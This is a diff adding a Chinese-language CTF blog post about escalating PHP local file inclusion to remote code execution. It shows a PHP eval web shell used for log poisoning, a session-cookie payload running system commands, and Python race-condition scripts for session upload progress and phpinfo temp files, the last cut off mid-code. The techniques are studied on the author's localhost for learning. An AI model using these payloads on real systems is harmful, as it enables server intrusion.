@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="LFIToRCE思路"/>
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2019/11/24/LFIToRCE思路/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="LFIToRCE思路">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/4codXB8VQSfHWha.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/4nToVYJsRD5rqg8.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/CR3ul4jHpWSIyTh.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/NGu9C2eUdLcIlJ1.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/uJ1TGDk5gzS6xMV.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/5f1EV6jkIMbipSK.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/fOVA84hX1P5BkS9.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/n4PDIEcRH8gf73j.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/fzWYD1XOewjFaVK.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/MDLsTnO1aodZY73.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/4volgL5JOZYzyCf.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/kwtXEaYsPn8Tghi.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/8jvYi2egnLDJWG6.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/7K3IaSoxXUbm5DV.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/uBxRcHzl7IEvaUO.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/jHbnMwmgavV3Etz.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/25/u8ysMqotZG7EHPj.png">
+<meta property="article:published_time" content="2019-11-24T13:03:15.000Z">
+<meta property="article:modified_time" content="2020-03-28T01:12:34.932Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/25/4codXB8VQSfHWha.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> LFIToRCE思路 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          LFIToRCE思路
+        
+      </h1>
+
+      <time class="post-time">
+          Nov 24 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#先说说代码审计中存在文件上传表单或者函数能写文件">先说说代码审计中，存在文件上传表单或者函数能写文件</a></li>
+<li><a href="#php中的一些协议">PHP中的一些协议</a><ul>
+<li><a href="#使用-php-封装器的-expectcommand">使用 PHP 封装器的 expect://command</a></li>
+<li><a href="#使用-php-封装器的phpfile">使用 PHP 封装器的php://file</a></li>
+<li><a href="#使用-php-封装器的phpfilter">使用 PHP 封装器的php://filter</a></li>
+<li><a href="#使用-php-的inputstream">使用 PHP 的input://stream</a></li>
+<li><a href="#使用-datatextplainbase64command">使用 data://text/plain;base64,command</a></li>
+<li><a href="#windows可绕过allow_url_include的限制rfi">windows可绕过<strong>allow_url_include</strong>的限制<strong>RFI</strong></a></li>
+</ul>
+</li>
+<li><a href="#日志文件-环境文件等可控文件">日志文件、环境文件等可控文件</a><ul>
+<li><a href="#apache-log-getshell">apache log  getshell</a></li>
+<li><a href="#procselfenviron">/proc/self/environ</a></li>
+<li><a href="#varlogmail">/var/log/mail</a></li>
+</ul>
+</li>
+<li><a href="#利用php会话值执行rce使用控制">利用PHP会话值执行RCE使用控制</a></li>
+<li><a href="#sessionlfi-getshell">session+LFI getshell</a></li>
+<li><a href="#phpinfo-lfi-包含临时文件getshell">phpinfo-LFI 包含临时文件getshell</a></li>
+<li><a href="#lfi-php7崩溃">LFI + php7崩溃</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h4><span id="先说说代码审计中存在文件上传表单或者函数能写文件">先说说代码审计中，存在文件上传表单或者函数能写文件</span></h4><ul>
+<li><p>写入路径在web目录外，外部用户无法直接访问时</p>
+</li>
+<li><p>后缀名无法被解析，比如<code>jpg</code>等</p>
+</li>
+</ul>
+<p>配合LFI即可RCE</p>
+<blockquote>
+<p>一个例子： <a href="https://xz.aliyun.com/t/6229" target="_blank" rel="noopener">https://xz.aliyun.com/t/6229</a> </p>
+<p>这个的LFI点是参数用于加载目标站点上的<code>JS文件</code></p>
+</blockquote>
+<p>然后是CTF中的一些思路，当然也包括第一个</p>
+<h4><span id="php中的一些协议">PHP中的一些协议</span></h4><h5><span id="使用-php-封装器的-expectcommand">使用 PHP 封装器的 expect://command</span></h5><p>emmm，但是这个一般不开启，xxe也可以和这个扩展结合</p>
+<h5><span id="使用-php-封装器的phpfile">使用 PHP 封装器的php://file</span></h5><p>很常见，访问本地文件系统</p>
+<blockquote>
+<p><code>file:///path/to/file.ext</code> 在文件包含中其实也就是等价<code>/path/to/file.ext</code> </p>
+<p>但是如果来个题目给你来个正则匹配<code>../</code> 或<code>/</code>开头的时候就可以用这个方法来绕过了。 </p>
+</blockquote>
+<h5><span id="使用-php-封装器的phpfilter">使用 PHP 封装器的php://filter</span></h5><h5><span id="使用-php-的inputstream">使用 PHP 的input://stream</span></h5><blockquote>
+<p><code>allow_url_include</code> 默认环境在php5.2之后默认为off,所以说这个用法比较鸡肋,但是平时在看phpinfo的时候可以查看下这个是否开启。 </p>
+</blockquote>
+<h5><span id="使用-datatextplainbase64command">使用 data://text/plain;base64,command</span></h5><p>=============================新增一个</p>
+<h5><span id="windows可绕过allow_url_include的限制rfi">windows可绕过<strong>allow_url_include</strong>的限制<strong>RFI</strong></span></h5><blockquote>
+<p>参考链接： <a href="https://byqiyou.github.io/2019/05/15/bypass-RFI限制的一些思路/" target="_blank" rel="noopener">https://byqiyou.github.io/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</a> </p>
+</blockquote>
+<p>==========================================================================</p>
+<h4><span id="日志文件-环境文件等可控文件">日志文件、环境文件等可控文件</span></h4><blockquote>
+<p> 文件读取漏洞路径收集：</p>
+<p> <a href="https://blog.csdn.net/qq_33020901/article/details/78810035" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/78810035</a> </p>
+</blockquote>
+<blockquote>
+<p>一般在Linux系统下通过<code>apt-get install apache2</code> 默认安装的apache 或者nginx都没有权限访问这些文件 ，但是有时候有些管理员会因为方便等问题导致权限配置错误。 🧐</p>
+</blockquote>
+<h5><span id="apache-log-getshell">apache log  getshell</span></h5><p>通过发包或者<code>nc</code></p>
+<blockquote>
+<p>这里为什么要用nc去访问，不用<code>http://xxxxxx/&lt;?php &gt;</code>这样的方式去访问，因为日志在存储的过程中会把符号转换成编码的形式，然后就无法产生一句话了。 </p>
+</blockquote>
+<p><code>web日志</code>常见的路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;acces_log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;error.log</span><br></pre></td></tr></table></figure>
+
+<p>为了方便，先把之前的<code>access.log</code>删除，在重启下apache</p>
+<p>以我<code>ubuntu 18.04</code>为例，尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/25/4codXB8VQSfHWha.png" alt="Snipaste_2019-11-25_16-36-39.png"></p>
+<p>查看日志</p>
+<p><img src="https://i.loli.net/2019/11/25/4nToVYJsRD5rqg8.png" alt="Snipaste_2019-11-25_16-40-20.png"></p>
+<p>尝试<code>lfi.php</code>中包含，发现失败，</p>
+<p><img src="https://i.loli.net/2019/11/25/CR3ul4jHpWSIyTh.png" alt="Snipaste_2019-11-25_16-35-36.png"></p>
+<p>果然没有读取权限。。。。</p>
+<p>我把这个文件内容放到能被包含到的地方，能成功getshell</p>
+<p><img src="https://i.loli.net/2019/11/25/NGu9C2eUdLcIlJ1.png" alt="Snipaste_2019-11-25_16-44-12.png"></p>
+<p>或者修改权限😋</p>
+<p><strong>所以以后尝试之前先包含一下这个文件，如果能包含，能够看到文件内容，这意味着你对这个文件具有读写权限 ，那么已经成功了大半</strong></p>
+<h5><span id="procselfenviron">/proc/self/environ</span></h5><blockquote>
+<p>参考链接：<a href="https://yq.aliyun.com/articles/441861" target="_blank" rel="noopener">https://yq.aliyun.com/articles/441861</a> </p>
+</blockquote>
+<p>我的<code>ubuntu 18.04</code>的默认权限😅</p>
+<p><img src="https://i.loli.net/2019/11/25/uJ1TGDk5gzS6xMV.png" alt="Snipaste_2019-11-25_17-08-18.png"></p>
+<p>那么也暂时不复现了。。偷懒</p>
+<h5><span id="varlogmail">/var/log/mail</span></h5><blockquote>
+<p>参考链接：<a href="https://xz.aliyun.com/t/3799#toc-15" target="_blank" rel="noopener">https://xz.aliyun.com/t/3799#toc-15</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tlpn</span><br></pre></td></tr></table></figure>
+
+<p>发现自己未开启<code>smtp</code>服务，那么也不复现了</p>
+<p>思路不难，和之前的类似，<code>SMTP日志投毒</code>，之前做过一题<code>ssrf</code>+<code>gopher</code></p>
+<p>类似的还有下面的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;self&#x2F;fd</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;vsftpd.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;sshd.log</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面的都可以通过<code>phpinfo()</code>来获取路径，或者靠爆破</p>
+<h4><span id="利用php会话值执行rce使用控制">利用PHP会话值执行RCE使用控制</span></h4><blockquote>
+<p>参考链接： <a href="https://www.4hou.com/vulnerable/7774.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/7774.html</a> </p>
+</blockquote>
+<p>其实说起来之前做题利用过<code>session</code>，当时是利用序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞，这里我们只需要写入<code>shell</code>即可</p>
+<p>存在一个LFI时，并且开启了<code>session</code></p>
+<blockquote>
+<p>php保存格式<code>sess_SESSIONID</code></p>
+<p>当然<code>phpinfo()</code>也可以看</p>
+<p><img src="https://i.loli.net/2019/11/25/5f1EV6jkIMbipSK.png" alt="Snipaste_2019-11-25_09-31-48.png"></p>
+<p>默认位置是</p>
+<p><code>/tmp/(PHP Sessions)</code></p>
+<p><code>/var/lib/php/session/(PHP Sessions)</code></p>
+<p><code>/var/lib/php5/(PHP Sessions)</code></p>
+</blockquote>
+<p>因为可能通常这两点不在同一个文件，特意分两个文件</p>
+<p><code>1.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include($_POST[&#39;file&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>2.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    echo $_COOKIE[&#39;user&#39;];</span><br><span class="line">    $_SESSION[&#39;name&#39;] &#x3D; $_COOKIE[&#39;user&#39;];</span><br></pre></td></tr></table></figure>
+
+<p>那么我们只需要构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:user&#x3D;%3C%3Fphp+system%28%22dir%22%29%3B%3F%3E</span><br></pre></td></tr></table></figure>
+
+<p>注意这里要<code>url编码</code>，之后会自动<code>url解码</code>一次，否则分号作为传递参数的分隔符</p>
+<p><img src="https://i.loli.net/2019/11/25/fOVA84hX1P5BkS9.png" alt="Snipaste_2019-11-25_09-44-55.png"></p>
+<p><img src="https://i.loli.net/2019/11/25/n4PDIEcRH8gf73j.png" alt="Snipaste_2019-11-25_09-44-33.png"></p>
+<p><strong>session还有另一个更加通用的思路</strong></p>
+<h4><span id="sessionlfi-getshell">session+LFI getshell</span></h4><p><code>session.upload_progress</code></p>
+<blockquote>
+<p> 官方文档：<a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a> </p>
+<p> 当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得 </p>
+</blockquote>
+<p>攻击流程</p>
+<p>1、构造上传表单，参考链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot; &#x2F;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; &#x2F;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; &#x2F;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>默认配置如下， <code>session.upload_progress.cleanup</code>开启，读取完post内容时,session内容就会清空,所以我们需要用到条件竞争,一直发送请求,然后一直包含。 </p>
+<p><img src="https://i.loli.net/2019/11/25/fzWYD1XOewjFaVK.png" alt="Snipaste_2019-11-25_10-12-40.png"></p>
+<p>2、bp或者脚本进行条件竞争</p>
+<p>上传包</p>
+<p><img src="https://i.loli.net/2019/11/25/MDLsTnO1aodZY73.png" alt="Snipaste_2019-11-25_10-31-57.png"></p>
+<p>请求包</p>
+<p><img src="https://i.loli.net/2019/11/25/4volgL5JOZYzyCf.png" alt="Snipaste_2019-11-25_10-32-48.png"></p>
+<blockquote>
+<p>请求包含我设置5000次,上传我设置1000次(这样可以一边持续请求,然后一边生成) </p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/25/kwtXEaYsPn8Tghi.png" alt="Snipaste_2019-11-25_10-30-27.png"></p>
+<p> 用@wonderkun师傅的一个脚本 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!coding:utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;</span><br><span class="line">PHPSESSID &#x3D; &#39;ssssssss&#39;</span><br><span class="line"></span><br><span class="line">def creatSession():</span><br><span class="line">    while True:</span><br><span class="line">        files &#x3D; &#123;</span><br><span class="line">            &quot;upload&quot; : (&quot;tmp.jpg&quot;, open(&quot;a.txt&quot;, &quot;rb&quot;))</span><br><span class="line">        &#125;</span><br><span class="line">        data &#x3D; &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : &quot;&lt;?php echo md5(&#39;1&#39;);?&gt;&quot; &#125;</span><br><span class="line">        headers &#x3D; &#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;&#39; + PHPSESSID&#125;</span><br><span class="line">        r &#x3D; requests.post(host+&#39;1.php&#39;,files &#x3D; files,headers &#x3D; headers,data&#x3D;data)</span><br><span class="line">        # print r.content.decode(&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line">fileName &#x3D; r&quot;E:\Program Files\phpstudy_pro\Extensions\tmp\tmp\sess_&quot;+PHPSESSID</span><br><span class="line">print fileName</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line"></span><br><span class="line">    url &#x3D; &quot;&#123;&#125;&#x2F;1.php?file&#x3D;&#123;&#125;&quot;.format(host,fileName)</span><br><span class="line">    headers &#x3D; &#123;&#39;Cookie&#39;:&#39;PHPSESSID&#x3D;&#39; + PHPSESSID&#125;</span><br><span class="line">    t &#x3D; threading.Thread(target&#x3D;creatSession,args&#x3D;())</span><br><span class="line">    t.setDaemon(True)</span><br><span class="line">    t.start()</span><br><span class="line">    while True:</span><br><span class="line">        res &#x3D; requests.post(url,data&#x3D;&#123;&#39;file&#39;:fileName&#125;,headers&#x3D;headers)</span><br><span class="line">        if &quot;c4ca4238a0b923820dcc509a6f75849b&quot; in res.content:</span><br><span class="line">            print(&quot;[*] Get shell success.&quot;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] retry.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/25/8jvYi2egnLDJWG6.png" alt="Snipaste_2019-11-25_12-58-58.png"></p>
+<h4><span id="phpinfo-lfi-包含临时文件getshell">phpinfo-LFI 包含临时文件getshell</span></h4><blockquote>
+<p>我们构造一个上传表单的时候,php也会生成一个对应的临时文件,这个文件的相关内容可以在<code>phpinfo()</code>的<code>_FILE[&quot;file&quot;]</code>查看到,但是临时文件很快就会被删除,所以我们赶在临时文件被删除之前,包含临时文件就可以getshell了。 </p>
+</blockquote>
+<p>根据<code>phpinfo()</code>中的<code>upload_tmp_dir</code> </p>
+<p>直接上脚本，参考链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG&#x3D;&quot;Security Test&quot;</span><br><span class="line">    PAYLOAD&#x3D;&quot;&quot;&quot;%s\r</span><br><span class="line">&lt;?php $c&#x3D;fopen(&#39;&#x2F;tmp&#x2F;g&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php phpinfo();?&gt;&#39;);?&gt;\r&quot;&quot;&quot; % TAG</span><br><span class="line">    REQ1_DATA&#x3D;&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;dummyname&quot;; filename&#x3D;&quot;test.txt&quot;\r</span><br><span class="line">Content-Type: text&#x2F;plain\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD</span><br><span class="line">    padding&#x3D;&quot;A&quot; * 5000</span><br><span class="line">    # 这里需要修改为phpinfo.php的地址</span><br><span class="line">    REQ1&#x3D;&quot;&quot;&quot;POST &#x2F;phpinfo.php?a&#x3D;&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP&#x2F;1.1\r</span><br><span class="line">Cookie: PHPSESSID&#x3D;q249llvfromc1or39t6tvnun42; othercookie&#x3D;&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r</span><br><span class="line">HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------7dbff1ded0714\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    #modify this to suit the LFI script</span><br><span class="line">    LFIREQ&#x3D;&quot;&quot;&quot;GET &#x2F;lfi.php?file&#x3D;%s HTTP&#x2F;1.1\r</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0\r</span><br><span class="line">Proxy-Connection: Keep-Alive\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">\r</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    return (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d &#x3D; 